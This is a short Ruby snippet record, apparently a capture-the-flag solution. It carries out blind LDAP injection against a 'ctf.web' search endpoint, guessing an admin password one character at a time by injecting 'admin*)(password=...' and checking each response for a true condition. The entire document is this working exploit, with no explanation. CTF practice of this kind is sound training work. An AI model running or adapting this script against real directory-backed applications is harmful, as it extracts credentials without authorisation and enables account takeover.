---
id: f5e3264d-ee3d-4675-b674-7549e6fa8c43
type: code
language: Ruby
verified: false
created_at: '2023-04-06T03:56:01.731564+00:00'
updated_at: '2023-04-10T20:36:29.433607+00:00'
---

# Code Snippet f5e3264d

**Language**: Ruby

```ruby
#!/usr/bin/env ruby

require 'net/http'
alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')

flag = ''

(0..50).each do |i|
  puts("[i] Looking for number #{i}")
  alphabet.each do |char|
    r = Net::HTTP.get(URI("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
    if /TRUE CONDITION/.match?(r)
      flag += char
      puts("[+] Flag: #{flag}")
      break
    end
  end
end
```
